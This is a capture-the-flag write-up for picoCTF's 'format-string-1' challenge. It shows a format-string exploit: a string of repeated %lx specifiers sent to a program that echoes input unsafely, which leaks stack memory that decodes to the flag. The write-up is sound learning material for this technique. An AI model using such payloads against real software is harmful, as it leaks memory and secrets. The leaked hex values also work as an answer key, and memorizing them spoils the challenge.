# format-string-1
picoCTF Link: [https://play.picoctf.org/practice/challenge/434](https://play.picoctf.org/practice/challenge/434)

## About

```
Description:
Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

Hints:
1. https://lettieri.iet.unipi.it/hacking/format-strings.pdf
2. Is this a 32-bit or 64-bit binary?
```

## Solution

When I looked at the code, I saw the flag was stored on the stack. The program let us write anything and then echo's the same string, without any formatting protections. Which let us print stuff from the stack using `%p` or `%lx`.

```
Give me your order and I'll read it back to you:
%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx
Here's your order: 402118,0,71cc85de2a00,0,1576880,a347834,7ffe56044d70,71cc85bd3e60,71cc85df84d0,1,7ffe56044e40,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,65355f673431665f,7d346263623736,7,71cc85dfa8d8,2300000007,206e693374307250,a336c797453,9
Bye!
```

`7b4654436f636970,355f31346d316e34,3478345f33317937,65355f673431665f,7d346263623736` looked like something printable, so I just tried to put in CyberChef and I was right!

I had only had to swap endianness with word length of 8 bytes, then from hex.